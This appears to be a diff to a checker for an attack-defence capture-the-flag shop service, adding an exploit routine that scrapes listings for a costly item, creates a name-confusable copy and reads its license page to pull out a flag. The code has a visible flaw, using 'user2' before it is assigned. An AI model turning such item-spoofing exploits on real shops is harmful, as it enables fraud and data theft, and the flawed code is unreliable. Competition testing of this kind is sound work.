@@ -4,7 +4,7 @@ from util import *
 from essential_generators import DocumentGenerator
 import html
 from datetime import datetime
-
+from bs4 import BeautifulSoup
 
 from enochecker3 import(
     ChainDB,
@@ -270,6 +270,83 @@ async def havoc_default_user_params(task: HavocCheckerTaskMessage, client: Async
     t1=datetime.now()
     logger.debug(f"HAVOC_USER_PARAMS - Total time {(t1-t0).total_seconds()} s")
 
+@checker.exploit(0)
+async def exploit_license(searcher: FlagSearcher, client: AsyncClient, logger: LoggerAdapter) -> None:
+    user1 = await register_user(client=client,logger=logger,db=None,chain_id=None)
+    min_price = 1825361099
+    cnt = 1
+    item_name =""
+    while True:
+        item_cost = 0
+        try:
+            response = await client.get(f"/shop/{1}/",follow_redirects=False)
+        except RequestError:
+            raise MumbleException("EXPLOIT - cannot request endpoint!")
+        data = BeautifulSoup(response,"html.parser")
+
+        links = data.find_all('a')
+        links = [link for link in links if "viewable-" in str(link)]
+        links = [str(link).split('"')[1] for link in links]
+        for link in links:
+            try:
+                response = await client.get(f"{link}",follow_redirects=False)
+            except RequestError:
+                raise MumbleException("EXPLOIT - cannot request endpoint!")
+            data = BeautifulSoup(response,"html.parser")
+            tables = data.find_all('tbody')
+            item_cost = int(str(tables[0]).split("\n")[8][4:-5])
+            if item_cost >= min_price:
+                name = data.find_all('h3')
+                item_name = str(name[0])[32:-5]   
+                break
+        cnt += 1
+        if item_cost >= min_price:
+                break
+    exploit_name = await make_item_name_exploitable(item_name)
+    shop_item_kwargs =  {
+        'data_path': '/frog.png',
+        'item_name': html.escape(exploit_name),
+        'logged_in': True,
+        'flag_str': "I STOLE A FLAG",
+        'username': user1['username'],
+        'password': user1['password1'],
+    }
+    item_id = await create_ShopItem(client=client,logger=logger,db=None,kwargs=shop_item_kwargs)
+
+    shop_listing_kwargs = {
+        'item_id': item_id,
+        'item_price': 1,
+        'description': html.escape(gen.sentence()),
+        'username': user2['username'],
+        'password': user2['password1'],
+    }
+    listing_id = await create_ShopListing(client=client,logger=logger,db=None,kwargs=shop_listing_kwargs)
+    await logout_user(client=client,logger=logger,db=None,kwargs={'logged_in':True})
+
+
+    user2 = await register_user(client=client,logger=logger,db=None,chain_id=None)
+    #http://localhost:8010/shop/item/108034/
+    try:
+        response = await client.get(f"shop/item/{listing_id}",follow_redirects=True)
+    except RequestError:
+        raise MumbleException("EXPLOIT - cannot request endpoint!")
+    
+    data = BeautifulSoup(response,'html.parser')
+    real_item_link = data.find_all('a')
+    correct_link = ""
+    for r_link in real_item_link:
+      if item_name in str(r_link):
+        correct_link = str(r_link)
+        break
+    correct_item_id = correct_link.split('"')[1]
+
+    try:
+        response = await client.get(f"user_items/license/{correct_item_id}")
+    except RequestError:
+        raise MumbleException("EXPLOIT - cannot request endpoint!")
+
+    if flag := searcher.search_flag(response.text):
+        return flag
     
 if __name__ == "__main__":
     checker.run()
